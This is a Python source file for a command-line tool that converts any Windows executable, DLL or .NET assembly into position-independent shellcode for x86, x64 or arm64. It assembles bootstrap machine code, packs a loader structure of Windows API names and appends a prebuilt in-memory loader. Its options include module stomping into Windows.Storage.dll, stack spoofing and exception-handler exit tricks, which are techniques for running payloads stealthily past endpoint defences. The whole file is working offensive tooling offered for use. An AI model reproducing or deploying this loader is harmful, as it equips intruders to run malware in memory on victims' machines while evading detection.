import struct
import re
import argparse
import os
from pathlib import Path
from dataclasses import dataclass
from typing import Optional


IMAGE_FILE_MACHINE_I386 = 0x014C
IMAGE_FILE_MACHINE_AMD64 = 0x8664
IMAGE_FILE_MACHINE_ARM64 = 0xAA64

IMAGE_FILE_DLL = 0x2000
IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR = 14

IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10B
IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20B

COMIMAGE_FLAGS_ILONLY = 0x00000001
COMIMAGE_FLAGS_32BITREQUIRED = 0x00000002
COMIMAGE_FLAGS_32BITPREFERRED = 0x00020000

PE_MACHINE_TO_ARCH = {
    IMAGE_FILE_MACHINE_I386: "x86",
    IMAGE_FILE_MACHINE_AMD64: "x64",
    IMAGE_FILE_MACHINE_ARM64: "arm64",
}

ARCH_TO_LOADER_SYMBOL = {
    "x86": "MEMORYMODULE_EXE_X86",
    "x64": "MEMORYMODULE_EXE_X64",
    "arm64": "MEMORYMODULE_EXE_ARM64",
}

LOADER_EXE_X64_RSP_ALIGN = bytes([
    0x55,                          # push rbp
    0x48, 0x89, 0xE5,              # mov rbp, rsp
    0x48, 0x83, 0xE4, 0xF0,        # and rsp, -0x10
    0x48, 0x83, 0xEC, 0x20,        # sub rsp, 0x20
    0xE8, 0x05, 0x00, 0x00, 0x00,  # call loader
    0x48, 0x89, 0xEC,              # mov rsp, rbp
    0x5D,                          # pop rbp
    0xC3,                          # ret
])

LOADER_TRAILER_PAD_X86 = b"\x00" * 32

DEFAULT_DOTNET_ANYCPU_ARCH = "x64"
SUPPORTED_GENERATION_ARCHES = {"x86", "x64", "arm64"}


def _fixed_bytes(value, size, field_name):
    if len(value) > size:
        raise ValueError(f"{field_name} is {len(value)} bytes, max {size}")
    return value.ljust(size, b"\x00")


def _fixed_c_string(value, size, field_name, encoding="ascii"):
    raw = value.encode(encoding)
    terminator = b"\x00\x00" if encoding == "utf-16le" else b"\x00"
    max_value_size = size - len(terminator)
    if len(raw) > max_value_size:
        raise ValueError(
            f"{field_name} is too long after {encoding} encoding "
            f"({len(raw)} bytes, max {max_value_size})"
        )
    return _fixed_bytes(raw + terminator, size, field_name)


@dataclass(frozen=True)
class PeInfo:
    machine: int
    arch: str
    is_dll: bool
    is_dotnet: bool
    is_dotnet_anycpu: bool
    dotnet_flags: Optional[int]
    optional_header_magic: int


def read_exe_to_buffer(exe_path):
    exe_path = Path(exe_path)
    if not exe_path.is_file():
        raise FileNotFoundError(f"Executable not found: {exe_path}")
    
    return exe_path.read_bytes()


def extract_byte_array_from_header(header_path, array_name):
    with open(header_path, "r") as f:
        content = f.read()

    # Match the array by name: MEMORYMODULE_EXE_X64[] = { ... };
    pattern = re.compile(
        rf"{array_name}\s*\[\s*\]\s*=\s*\{{(.*?)\}};",
        re.DOTALL
    )
    match = pattern.search(content)
    if not match:
        raise ValueError(f"Array {array_name} not found in the header.")

    array_content = match.group(1)

    # Extract all hex values
    hex_values = re.findall(r"0x[0-9a-fA-F]{2}", array_content)
    byte_array = bytes(int(h, 16) for h in hex_values)
    return byte_array


def _require_size(buffer, offset, size, description):
    if offset < 0 or offset + size > len(buffer):
        raise ValueError(f"Invalid PE: {description} is outside the file")


def _machine_name(machine):
    arch = PE_MACHINE_TO_ARCH.get(machine)
    if arch:
        return arch
    return f"unknown(0x{machine:04x})"


def _rva_to_offset(rva, sections, size_of_headers, file_size):
    for section in sections:
        virtual_address = section["virtual_address"]
        virtual_size = max(section["virtual_size"], section["raw_size"])
        if virtual_size == 0:
            continue

        if virtual_address <= rva < virtual_address + virtual_size:
            offset = section["raw_pointer"] + (rva - virtual_address)
            if offset < file_size:
                return offset

    if rva < size_of_headers and rva < file_size:
        return rva

    return None


def parse_pe_info(buffer):
    _require_size(buffer, 0, 0x40, "DOS header")
    if buffer[0:2] != b"MZ":
        raise ValueError("Invalid PE: missing MZ signature")

    e_lfanew = struct.unpack_from("<I", buffer, 0x3C)[0]
    _require_size(buffer, e_lfanew, 4 + 20, "NT headers")
    if buffer[e_lfanew:e_lfanew + 4] != b"PE\0\0":
        raise ValueError("Invalid PE: missing PE signature")

    file_header_offset = e_lfanew + 4
    machine = struct.unpack_from("<H", buffer, file_header_offset)[0]
    number_of_sections = struct.unpack_from("<H", buffer, file_header_offset + 2)[0]
    size_of_optional_header = struct.unpack_from("<H", buffer, file_header_offset + 16)[0]
    characteristics = struct.unpack_from("<H", buffer, file_header_offset + 18)[0]

    arch = PE_MACHINE_TO_ARCH.get(machine)
    if arch is None:
        raise ValueError(f"Unsupported PE machine: 0x{machine:04x}")

    optional_header_offset = file_header_offset + 20
    _require_size(buffer, optional_header_offset, size_of_optional_header, "optional header")
    optional_header_magic = struct.unpack_from("<H", buffer, optional_header_offset)[0]

    if optional_header_magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC:
        data_directory_offset = optional_header_offset + 0x60
    elif optional_header_magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC:
        data_directory_offset = optional_header_offset + 0x70
    else:
        raise ValueError(f"Unsupported PE optional header magic: 0x{optional_header_magic:04x}")

    size_of_headers = struct.unpack_from("<I", buffer, optional_header_offset + 0x3C)[0]

    section_header_offset = optional_header_offset + size_of_optional_header
    _require_size(buffer, section_header_offset, number_of_sections * 40, "section headers")

    sections = []
    for index in range(number_of_sections):
        section_offset = section_header_offset + index * 40
        virtual_size = struct.unpack_from("<I", buffer, section_offset + 8)[0]
        virtual_address = struct.unpack_from("<I", buffer, section_offset + 12)[0]
        raw_size = struct.unpack_from("<I", buffer, section_offset + 16)[0]
        raw_pointer = struct.unpack_from("<I", buffer, section_offset + 20)[0]
        sections.append({
            "virtual_size": virtual_size,
            "virtual_address": virtual_address,
            "raw_size": raw_size,
            "raw_pointer": raw_pointer,
        })

    com_descriptor_offset = data_directory_offset + IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR * 8
    is_dotnet = False
    dotnet_flags = None

    if com_descriptor_offset + 8 <= optional_header_offset + size_of_optional_header:
        _require_size(buffer, com_descriptor_offset, 8, "COM descriptor data directory")
        com_descriptor_rva, com_descriptor_size = struct.unpack_from("<II", buffer, com_descriptor_offset)
        is_dotnet = com_descriptor_rva != 0 and com_descriptor_size != 0

        if is_dotnet:
            cor20_offset = _rva_to_offset(com_descriptor_rva, sections, size_of_headers, len(buffer))
            if cor20_offset is not None and cor20_offset + 20 <= len(buffer):
                dotnet_flags = struct.unpack_from("<I", buffer, cor20_offset + 16)[0]

    is_dotnet_anycpu = (
        is_dotnet
        and machine == IMAGE_FILE_MACHINE_I386
        and optional_header_magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC
        and dotnet_flags is not None
        and (dotnet_flags & COMIMAGE_FLAGS_ILONLY) != 0
        and (dotnet_flags & COMIMAGE_FLAGS_32BITREQUIRED) == 0
        and (dotnet_flags & COMIMAGE_FLAGS_32BITPREFERRED) == 0
    )

    return PeInfo(
        machine=machine,
        arch=arch,
        is_dll=(characteristics & IMAGE_FILE_DLL) != 0,
        is_dotnet=is_dotnet,
        is_dotnet_anycpu=is_dotnet_anycpu,
        dotnet_flags=dotnet_flags,
        optional_header_magic=optional_header_magic,
    )


def resolve_target_arch(requested_arch, pe_info):
    if requested_arch == "auto":
        if pe_info.is_dotnet_anycpu:
            return DEFAULT_DOTNET_ANYCPU_ARCH
        return pe_info.arch

    if pe_info.is_dotnet_anycpu:
        return requested_arch

    if requested_arch != pe_info.arch:
        raise ValueError(
            f"Requested --arch {requested_arch} does not match payload machine "
            f"{_machine_name(pe_info.machine)}. Use --arch {pe_info.arch} or --arch auto."
        )

    return requested_arch


def ensure_generation_arch_supported(target_arch):
    if target_arch in SUPPORTED_GENERATION_ARCHES:
        return

    raise NotImplementedError(
        f"Target architecture {target_arch} is not wired for shellcode generation."
    )


def validate_payload_options(pe_info, method_name):
    if pe_info.is_dll and not pe_info.is_dotnet and not method_name.strip():
        raise ValueError("Native DLL payloads require --method to name the exported function.")


def print_arch_summary(pe_info, requested_arch, target_arch):
    payload_kind = ".NET (managed)" if pe_info.is_dotnet else "native (unmanaged)"
    print(f"File is a {payload_kind} executable.")
    print(f"Payload architecture: {_machine_name(pe_info.machine)}")

    if pe_info.is_dotnet_anycpu:
        print(".NET AnyCPU detected: selected loader architecture controls execution.")

    if requested_arch == "auto" and pe_info.is_dotnet_anycpu:
        print(f"Target architecture: {target_arch} (default for --arch auto + AnyCPU)")
    else:
        print(f"Target architecture: {target_arch}")


def _arch_pointer_size(target_arch):
    return 4 if target_arch == "x86" else 8


def _has_runtime_function_table(target_arch):
    return target_arch in {"x64", "arm64"}


def _has_stack_spoofing(target_arch):
    return target_arch == "x64"


def _pack_rel32(value):
    if value < -(1 << 31) or value >= (1 << 31):
        raise ValueError(f"Relative offset is out of range: {value}")
    return struct.pack("<i", value)


def _pack_arm64_instruction(value):
    return struct.pack("<I", value & 0xFFFFFFFF)


def _encode_arm64_adr(rd, immediate):
    if rd < 0 or rd > 31:
        raise ValueError(f"Invalid ARM64 register: {rd}")
    if immediate < -(1 << 20) or immediate >= (1 << 20):
        raise ValueError(f"ARM64 ADR immediate is out of range: {immediate}")

    encoded_imm = immediate & ((1 << 21) - 1)
    immlo = encoded_imm & 0x3
    immhi = (encoded_imm >> 2) & 0x7FFFF
    return _pack_arm64_instruction(0x10000000 | (immlo << 29) | (immhi << 5) | rd)


def _encode_arm64_b(current_offset, target_offset):
    delta = target_offset - current_offset
    if delta % 4 != 0:
        raise ValueError(f"ARM64 branch target is not 4-byte aligned: {target_offset}")

    imm26 = delta // 4
    if imm26 < -(1 << 25) or imm26 >= (1 << 25):
        raise ValueError(f"ARM64 branch target is out of range: {delta}")

    return _pack_arm64_instruction(0x14000000 | (imm26 & 0x03FFFFFF))


def build_shellcode_blob(target_arch, instance_blob, memorymodule_loader):
    if target_arch == "x64":
        shellcode = bytearray()
        # call after_instance; the pushed return address is the inline INSTANCE blob.
        shellcode += b"\xE8" + _pack_rel32(len(instance_blob))
        shellcode += instance_blob
        shellcode += b"\x59"  # pop rcx: Windows x64 first argument = INSTANCE*
        # Align rsp, reserve shadow space, and call the loader bytes that follow.
        shellcode += LOADER_EXE_X64_RSP_ALIGN
        shellcode += memorymodule_loader
        return shellcode

    if target_arch == "x86":
        cleanup = b"\x83\xC4\x04\xC2\x04\x00"  # add esp, 4; ret 4

        shellcode = bytearray()
        # call after_instance; pop ecx recovers the inline INSTANCE pointer.
        shellcode += b"\xE8" + _pack_rel32(len(instance_blob))
        shellcode += instance_blob
        shellcode += b"\x59"  # pop ecx
        # Insert INSTANCE* as the loader stack argument while preserving the caller return.
        shellcode += b"\x5A"  # pop edx
        shellcode += b"\x52"  # push edx
        shellcode += b"\x51"  # push ecx
        # call skips over cleanup and enters Loader; Loader returns into cleanup.
        shellcode += b"\xE8" + _pack_rel32(len(cleanup))
        shellcode += cleanup
        shellcode += memorymodule_loader
        shellcode += LOADER_TRAILER_PAD_X86
        return shellcode

    if target_arch == "arm64":
        bootstrap_size = 8
        loader_offset = bootstrap_size + len(instance_blob)
        bootstrap = bytearray()
        bootstrap += _encode_arm64_adr(0, bootstrap_size)  # adr x0, instance
        bootstrap += _encode_arm64_b(4, loader_offset)     # b Loader

        shellcode = bytearray()
        shellcode += bootstrap
        shellcode += instance_blob
        shellcode += memorymodule_loader
        return shellcode

    raise ValueError(f"Unsupported target architecture: {target_arch}")


# Define the INSTANCE struct layout in Python
class Instance:
    def __init__(self, moduleSize, isDll, sdllMethode, isDotNet, dotnetLoaderSize, dotnetModuleSize,
                 target_arch, args="", exit_mode=1, module_stomping=False):
        self.target_arch = target_arch
        self.pointer_size = _arch_pointer_size(target_arch)
        self.has_runtime_function_table = _has_runtime_function_table(target_arch)
        self.has_stack_spoofing = _has_stack_spoofing(target_arch)

        # Allocate space for string fields (32 bytes each)
        self.sKernel32DLL = _fixed_c_string("kernel32.dll", 32, "sKernel32DLL")
        self.sNtDLL = _fixed_c_string("ntdll.dll", 32, "sNtDLL")
        self.wsKernel32DLL = _fixed_c_string("KERNEL32.DLL", 64, "wsKernel32DLL", "utf-16le")
        self.sKernelBaseDLL = _fixed_c_string("kernelbase.dll", 32, "sKernelBaseDLL")

        self.sGetProcAddress = _fixed_c_string("GetProcAddress", 32, "sGetProcAddress")
        self.sGetModuleHandleA = _fixed_c_string("GetModuleHandleA", 32, "sGetModuleHandleA")
        self.sLoadLibraryA = _fixed_c_string("LoadLibraryA", 32, "sLoadLibraryA")
        self.sVirtualAlloc = _fixed_c_string("VirtualAlloc", 32, "sVirtualAlloc")
        self.sVirtualFree = _fixed_c_string("VirtualFree", 32, "sVirtualFree")
        self.sVirtualProtect = _fixed_c_string("VirtualProtect", 32, "sVirtualProtect")
        self.sGetNativeSystemInfo = _fixed_c_string("GetNativeSystemInfo", 32, "sGetNativeSystemInfo")
        self.sRtlLookupFunctionEntry = _fixed_c_string("RtlLookupFunctionEntry", 32, "sRtlLookupFunctionEntry")
        self.sBaseThreadInitThunk = _fixed_c_string("BaseThreadInitThunk", 32, "sBaseThreadInitThunk")
        self.sRtlUserThreadStart = _fixed_c_string("RtlUserThreadStart", 32, "sRtlUserThreadStart")
        self.sGetCommandLineA = _fixed_c_string("GetCommandLineA", 32, "sGetCommandLineA")
        self.sRtlAddFunctionTable = _fixed_c_string("RtlAddFunctionTable", 32, "sRtlAddFunctionTable")
        self.sSleep = _fixed_c_string("Sleep", 32, "sSleep")
        self.sAddVectoredExceptionHandler = _fixed_c_string(
            "RtlAddVectoredExceptionHandler",
            32,
            "sAddVectoredExceptionHandler",
        )
        self.sRemoveVectoredExceptionHandler = _fixed_c_string(
            "RtlRemoveVectoredExceptionHandler",
            64,
            "sRemoveVectoredExceptionHandler",
        )
        self.sExitThread = _fixed_c_string("ExitThread", 32, "sExitThread")
        self.sExitProcess = _fixed_c_string("ExitProcess", 32, "sExitProcess")
        self.sFlushInstructionCache = _fixed_c_string("FlushInstructionCache", 32, "sFlushInstructionCache")
        self.sGetCurrentProcess = _fixed_c_string("GetCurrentProcess", 32, "sGetCurrentProcess")
        self.sRtlExitUserProcess = _fixed_c_string("RtlExitUserProcess", 32, "sRtlExitUserProcess")

        self.moduleSize = moduleSize

        self.exit_mode = exit_mode

        self.isModuleStompingUsed = 1 if module_stomping else 0
        self.sModuleToStomp = _fixed_c_string("Windows.Storage.dll", 32, "sModuleToStomp")

        self.instanceSize = 0x69696969
        self.loaderSize = 0x70707070

        self.sMagicBytes = _fixed_bytes(b"\x4D\x5A", 8, "sMagicBytes")
        self.sGadget = _fixed_bytes(b"\xFF\x23", 8, "sGadget")

        self.sDataSec = _fixed_c_string(".data", 8, "sDataSec")
        self.sPDataSec = _fixed_c_string(".pdata", 8, "sPDataSec")

        if isDotNet:
            cmdLine = args
        else:
            cmdLine = "e " + args
        
        self.sCmdLine = _fixed_c_string(cmdLine, 2048, "sCmdLine", "utf-16le")
        

        self.isDll = isDll
        self.sdllMethode = _fixed_c_string(sdllMethode, 256, "sdllMethode", "utf-8")

        self.isDotNet = isDotNet
        self.dotnetLoaderSize = dotnetLoaderSize
        self.dotnetModuleSize = dotnetModuleSize

    def pack(self):
        api_pointer_count = 8
        if self.has_stack_spoofing:
            api_pointer_count += 3
        if self.has_runtime_function_table:
            api_pointer_count += 1
        api_pointer_count += 7

        parts = [
            struct.pack("<I", 0),  # lenTest
            self.sKernel32DLL,
            self.sNtDLL,
            self.wsKernel32DLL,
            self.sKernelBaseDLL,
            
            self.sGetProcAddress,
            self.sGetModuleHandleA,
            self.sLoadLibraryA,
            self.sVirtualAlloc,
            self.sVirtualFree,
            self.sVirtualProtect,
            self.sGetNativeSystemInfo,
        ]

        if self.has_stack_spoofing:
            parts += [
                self.sRtlLookupFunctionEntry,
                self.sBaseThreadInitThunk,
                self.sRtlUserThreadStart,
            ]

        parts += [
            self.sGetCommandLineA,
        ]

        if self.has_runtime_function_table:
            parts.append(self.sRtlAddFunctionTable)

        parts += [
            self.sSleep,
            self.sAddVectoredExceptionHandler,
            self.sRemoveVectoredExceptionHandler,
            self.sExitThread,
            self.sExitProcess,
            self.sFlushInstructionCache,
            self.sGetCurrentProcess,
            self.sRtlExitUserProcess,
            b"\x00" * (api_pointer_count * self.pointer_size),

            struct.pack("<I", self.moduleSize),

            struct.pack("B", self.isModuleStompingUsed),
            self.sModuleToStomp,

            struct.pack("<I", self.instanceSize ),  
            struct.pack("<I", self.loaderSize),
            self.sMagicBytes,
            self.sDataSec,
            self.sCmdLine,
            struct.pack("<B", self.exit_mode),

            b"\x00" * (4 * self.pointer_size),  # EXIT_VEH_CONTEXT pointer fields
            b"\x00" * 4,                        # EXIT_VEH_CONTEXT byte fields
        ]

        if self.has_runtime_function_table:
            parts.append(self.sPDataSec)

        if self.has_stack_spoofing:
            parts.append(self.sGadget)

        parts += [
            struct.pack("B", self.isDll),
            self.sdllMethode,
            struct.pack("B", self.isDotNet),
            struct.pack("<I", self.dotnetLoaderSize),
            struct.pack("<I", self.dotnetModuleSize),
            b"\x00" * self.pointer_size, # ptrModuleTst
            b"\x00" * self.pointer_size, # ptrDotNetModuleTst
            
        ]
        blob = b"".join(parts)
        self.instanceSize = len(blob)
        return blob


def buildLoaderShellcode(fileName, methodeDll, args, exit_mode, requested_arch, module_stomping):

    peBinary = read_exe_to_buffer(fileName)

    pe_info = parse_pe_info(peBinary)
    target_arch = resolve_target_arch(requested_arch, pe_info)
    print_arch_summary(pe_info, requested_arch, target_arch)
    ensure_generation_arch_supported(target_arch)
    validate_payload_options(pe_info, methodeDll)

    isDotNet = pe_info.is_dotnet

    dotnetLoader = b""
    if isDotNet:
        isDotNet=1
        dotnetLoader_path = os.path.join(Path(__file__).parent, 'bin', target_arch, 'goodClr.dll')
        dotnetLoader = read_exe_to_buffer(dotnetLoader_path)
    else:
        isDotNet=0

    peIsDll = pe_info.is_dll

    #
    # Create and pack the instance structure
    #
    moduleSize = len(dotnetLoader) if isDotNet else len(peBinary)
    isDll = peIsDll
    if isDotNet:
        sdllMethode = "go"
    elif isDll:
        sdllMethode = methodeDll
    else:
        sdllMethode = ""
    dotnetLoaderSize = len(dotnetLoader) if isDotNet else 0
    dotnetModuleSize = len(peBinary) if isDotNet else 0

    inst = Instance(
        moduleSize,
        isDll,
        sdllMethode,
        isDotNet,
        dotnetLoaderSize,
        dotnetModuleSize,
        target_arch,
        args,
        exit_mode,
        module_stomping,
    )
    blob = inst.pack()

    # Compute the required padding length
    padding_length = (16 - (len(blob) % 16)) % 16  # result is 0 if already aligned

    print("padding_length ", padding_length);

    # Add padding
    blob += b'\x00' * padding_length

    #
    # Get the loader_size and instance_size
    #

    header_file = os.path.join(Path(__file__).parent, f"bin/memorymodule_exe_{target_arch}.h")
    array_name = ARCH_TO_LOADER_SYMBOL[target_arch]

    try:
        memorymodule_loader = extract_byte_array_from_header(header_file, array_name)
        print(f"Extracted {len(memorymodule_loader)} bytes.")
    except Exception as e:
        raise RuntimeError(f"Unable to load {array_name} from {header_file}") from e


    instance_size = len(blob)
    loader_size = len(memorymodule_loader)

    print(f"Instance struct size: {instance_size} bytes")
    print(f"Loader size: {loader_size} bytes")

    #
    # Step 2: Find the offsets of the placeholder patterns
    #
    offset_instance_size = blob.find(struct.pack("<I", 0x69696969))
    offset_loader_size   = blob.find(struct.pack("<I", 0x70707070))

    if offset_instance_size == -1 or offset_loader_size == -1:
        raise ValueError("Placeholder values not found in blob")

    #
    # Step 3: Overwrite the placeholders with actual values
    #
    blob = (
        blob[:offset_instance_size] +
        struct.pack("<I", instance_size) +
        blob[offset_instance_size + 4:]
    )

    blob = (
        blob[:offset_loader_size] +
        struct.pack("<I", loader_size) +
        blob[offset_loader_size + 4:]
    )

    shellcode = build_shellcode_blob(target_arch, blob, memorymodule_loader)

    if isDotNet:
        # If it's a .NET executable, append the dotnetLoader
        shellcode += dotnetLoader

    shellcode += peBinary

    print("final shellcode ", len(shellcode), " bytes");

    # Write final shellcode
    with open("finalShellcode.bin", "wb") as f:
        f.write(shellcode)


def is_dll_manual(data):
    return parse_pe_info(data).is_dll


def is_dotnet_executable(buffer):
    return parse_pe_info(buffer).is_dotnet


def main():

    parser = argparse.ArgumentParser(description="Generate shellcode from any given PE.")

    parser.add_argument("-f", "--file", required=True, help="PE file path (DLL or EXE)")
    parser.add_argument("-m", "--method", default="", help="Method name to invoke in case of DLL")
    parser.add_argument("-c", "--cmd", default="", help="Command line arguments")
    parser.add_argument("-a", "--arch", choices=["auto", "x86", "x64", "arm64"], default="auto",
                        help="Target loader architecture: auto, x86, x64, or arm64")
    module_stomping_group = parser.add_mutually_exclusive_group()
    module_stomping_group.add_argument("--module-stomping", dest="module_stomping", action="store_true",
                                       help="Enable module stomping into Windows.Storage.dll")
    module_stomping_group.add_argument("--no-module-stomping", dest="module_stomping", action="store_false",
                                       help="Use private allocation instead of module stomping (default)")
    parser.set_defaults(module_stomping=False)
    parser.add_argument("-x", "--exit", type=int, choices=[1, 2, 3], default=1,
                        help="Exit behavior: 1=exit thread, 2=exit process, 3=block indefinitely")

    args = parser.parse_args()

    try:
        buildLoaderShellcode(
            args.file,
            args.method,
            args.cmd,
            args.exit,
            args.arch,
            args.module_stomping,
        )
    except (ValueError, NotImplementedError, RuntimeError, OSError) as exc:
        parser.exit(1, f"error: {exc}\n")


if __name__ == "__main__":
    main()
